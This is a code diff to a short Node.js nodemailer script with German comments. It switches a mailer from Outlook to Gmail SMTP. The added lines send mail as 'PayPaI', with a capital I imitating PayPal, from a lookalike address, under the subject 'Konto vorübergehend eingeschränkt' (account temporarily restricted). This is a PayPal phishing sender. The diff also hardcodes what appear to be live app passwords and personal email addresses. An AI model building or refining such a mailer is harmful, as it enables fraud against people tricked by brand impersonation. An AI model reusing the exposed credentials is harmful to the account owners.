@@ -1,31 +1,30 @@
 const nodemailer = require("nodemailer");
 const fs = require("fs");
 
-const html = fs.readFileSync("./mail.html", "utf8");
+const html = fs.readFileSync("./mail2.html", "utf8");
 
-// OUTLOOK DATEN
-const OUTLOOK_USER = "paypaI.benz.login@outlook.com"; // z.B. name@outlook.de
-const OUTLOOK_APP_PASS = "ullocxwtzyewbqqd";
-const TO = "jonasbenz25@gmail.com"; // zum Test auch deine eigene Adresse ok
+// GMAIL DATEN (ECHT & LEGITIM EINTRAGEN)
+const GMAIL_USER = "paypai.service.benz@gmail.com";
+const GMAIL_APP_PASS = "osrvqiudzzybrjum";
+const TO = "holzerluis3@gmail.com"; // zuerst an dich selbst testen
 
 async function main() {
   const transporter = nodemailer.createTransport({
-    host: "smtp-mail.outlook.com",
-    port: 587,
-    secure: false,
+    service: "gmail",
     auth: {
-      user: OUTLOOK_USER,
-      pass: OUTLOOK_APP_PASS,
+      user: GMAIL_USER,
+      pass: GMAIL_APP_PASS,
     },
   });
-// Testet Login + Verbindung (sehr hilfreich)
+
+  // Login testen
   await transporter.verify();
-  console.log("SMTP Login OK");
+  console.log("Gmail SMTP Login OK");
 
   const info = await transporter.sendMail({
-    from: `"Thomas" <${OUTLOOK_USER}>`,
+    from: `PayPaI <${GMAIL_USER}>`,
     to: TO,
-    subject: "HTML Testmail (Outlook SMTP)",
+    subject: "Konto vorübergehend eingeschränkt",
     html,
     text: "Das ist die Text-Version der Mail.",
   });
